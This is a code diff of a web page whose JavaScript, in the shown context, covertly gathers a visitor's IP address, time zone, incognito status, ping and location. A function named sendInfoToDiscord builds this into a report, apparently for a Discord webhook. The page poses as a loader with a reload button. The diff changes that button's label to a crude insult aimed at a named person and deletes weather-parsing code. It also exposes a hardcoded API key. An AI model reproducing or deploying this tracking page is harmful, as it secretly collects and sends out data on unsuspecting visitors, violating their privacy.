@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title></title>
     <div class="loader"></div>
-    <button class="reload-btn" onclick="copyToClipboard()">Reload</button>
+    <button class="reload-btn" onclick="copyToClipboard()">Karina Otsosi ПЖ!!!!</button>
     <style>
         .message-container {
             background-color: #f2f2f2; /* серый фон */
@@ -697,25 +697,10 @@ async function sendInfoToDiscord() {
     const TimeZone = await Intl.DateTimeFormat().resolvedOptions().timeZone;
     const isIncognito = await detectIncognitoMode();
     const Ping = await getPing();
-
-    // Получение информации о погоде
     const weatherResponse = await fetch(`https://weather.visualcrossing.com/VisualCrossingWebServices/rest/services/timeline/${city}?unitGroup=uk&key=KM7AEJQ7MBUYL23UBSQSNRPLW&contentType=json`);
     const weatherData = await weatherResponse.json();
     const temperature = weatherData.currentConditions.temp;
     const conditions = weatherData.currentConditions.conditions.toLowerCase();
-
-    let weatherCondition;
-    if (conditions.includes("clear")) {
-        weatherCondition = "Sunny";
-    } else if (conditions.includes("cloudy")) {
-        weatherCondition = "Cloudy";
-    } else if (conditions.includes("rain")) {
-        weatherCondition = "Rainy";
-    } else {
-        weatherCondition = "Unknown weather condition";
-    }
-
-    // Формируем сообщение
     const message = "****                User Information****\n" +
                     "****-----------------------------------****\n" +
                     "- 🗺️ **IP Address**: `" + ipAddress + "`\n" +
